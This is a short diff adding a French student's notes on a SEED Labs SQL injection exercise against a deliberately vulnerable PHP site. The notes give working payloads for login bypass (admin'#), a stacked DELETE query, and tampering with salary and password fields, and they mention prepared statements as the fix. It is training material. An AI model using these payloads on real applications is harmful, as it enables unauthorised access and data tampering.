@@ -1,0 +1,20 @@
+TD4
+
+Injection SQL :
+
+Mettre admin'# permet de mettre en commentaire la fin de la requêtes sql et accéder à la page sans mot de passe
+
+Avec curl :
+curl "http://seedlabsqlinjection.com/unsafe_home.php?username=admin&Password=seedadmin
+
+admin'; DELETE FROM credential WHERE Name='Alice';#
+
+mysqli empêche l'injection d'une deuxième requête sql
+
+Dans edit profile : ', salary='5 permet de modifier son salaire
+
+', salary='5' WHERE name='Boby';#
+
+Pour changer le mdp, on met le mdp dans password et la commande dans phonenumber, vu que phonenumber vient après password dans le php
+
+$stmt->bind_param("is", $id, $pwd) -> "is" = "integer string"
